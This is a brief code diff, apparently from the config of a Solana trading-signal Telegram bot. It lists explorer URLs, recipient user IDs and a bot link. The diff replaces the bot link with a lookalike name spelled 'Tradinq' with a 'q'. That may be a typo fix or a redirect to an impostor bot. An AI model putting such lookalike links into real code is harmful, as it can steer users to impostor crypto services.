@@ -8,7 +8,7 @@ const solscanNetworkAddress = "https://solscan.io/account/";
 const explorerNetworkTx = "https://explorer.solana.com/address/";
 const explorerNetworkTxEnd = "?cluster=mainnet";
 const botSupportUsername = "@trade_signal_hive"; // CHANGE THIS
-const botLink = "https://t.me/SanijTradingBot?start="; // CHANGE THIS
+const botLink = "https://t.me/SanjiTradinqBot?start="; // CHANGE THIS
 const rickBurpBot = "https://t.me/RickBurpBot?start=";
 const defaultTimer = 300; 
 const recipientIds = [588749749, 8126571996]; // Replace with actual recipient user IDs // CHANGE The second one
